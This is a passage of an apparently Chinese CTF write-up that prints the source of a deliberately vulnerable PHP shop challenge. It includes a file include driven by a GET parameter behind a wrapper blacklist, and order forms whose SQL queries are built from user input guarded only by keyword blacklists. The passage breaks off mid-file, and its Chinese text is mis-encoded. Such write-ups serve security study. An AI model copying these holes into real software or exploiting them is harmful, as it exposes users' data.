class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;index&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;2077å‘å”®äº†,ä¸æ¥ä»½å®ä½“å…¸è—ç‰ˆå—?&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">img</span> <span class="title">class</span>=&quot;<span class="title">logo</span>&quot; <span class="title">src</span>=&quot;./<span class="title">assets</span>/<span class="title">img</span>/<span class="title">logo</span>-<span class="title">en</span>.<span class="title">png</span>&quot;&gt;&lt;!--<span class="title">LOGOLOGOLOGOLOGO</span>--&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h3</span>&gt;æäº¤è®¢å•&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">role</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;./<span class="title">confirm</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">application</span>/<span class="title">x</span>-<span class="title">www</span>-<span class="title">urlencoded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;å§“å:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;ç”µè¯:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;åœ°å€:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;æˆ‘æ­£æ˜¯é€é’±ä¹‹äºº&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;è®¢å•ç®¡ç†&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">change</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦ä¿®æ”¹æ”¶è´§åœ°å€&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!--?<span class="title">file</span>=?--&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230507212819532.png" alt="image-20230507212819532"></p><p>æŸ¥çœ‹è§£æå‡ºæ¥çš„ä»£ç ï¼Œå‘ç°è¿˜å¯ä»¥ç»§ç»­è¿›è¡Œè¯»å–</p><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="string">&quot;address&quot;</span>]);</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;address&#x27;</span>].<span class="string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$db</span>-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æœªæ‰¾åˆ°è®¢å•!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;ä¿¡æ¯ä¸å…¨&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/title&gt;</span><br><span class="line">&lt;base href=<span class="string">&quot;./&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/bootstrap.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/custom-animations.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;assets/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;h&quot;</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-8 <span class="title">col</span>-<span class="title">md</span>-<span class="title">offset</span>-2 <span class="title">centered</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span>&gt;ä¿®æ”¹æ”¶è´§åœ°å€&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;å§“å:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">user_name</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;ç”µè¯:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">phone</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span>&gt;åœ°å€:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">subscribe</span>-<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">address</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span>  <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot;&gt;ä¿®æ”¹è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span> <span class="title">global</span> $<span class="title">msg</span>; <span class="title">echo</span> &#x27;&lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;&#x27;.$<span class="title">msg</span>.&#x27;&lt;/<span class="title">h2</span>&gt;&#x27;;?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">f</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">style</span>=&quot;<span class="title">margin</span>:35<span class="title">px</span> 0;&quot;&gt;&lt;<span class="title">br</span>&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span> <span class="title">class</span>=&quot;<span class="title">mb</span>&quot;&gt;è®¢å•ç®¡ç†&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&#x27;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">sub</span> <span class="title">btn</span>-<span class="title">white</span>&#x27;&gt;è¿”å›&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">search</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘è¦æŸ¥è®¢å•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;./<span class="title">delete</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">button</span> <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">register</span> <span class="title">btn</span>-<span class="title">white</span>&quot; &gt;æˆ‘ä¸æƒ³è¦äº†&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">bootstrap</span>.<span class="title">min</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">retina</span>-1.1.0.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">script</span> <span class="title">src</span>=&quot;<span class="title">assets</span>/<span class="title">js</span>/<span class="title">jquery</span>.<span class="title">unveilEffects</span>.<span class="title">js</span>&quot;&gt;&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>search.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class="line">    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];</span><br><span class="line">    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123; </span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$row</span>) &#123;</span><br><span class="line">            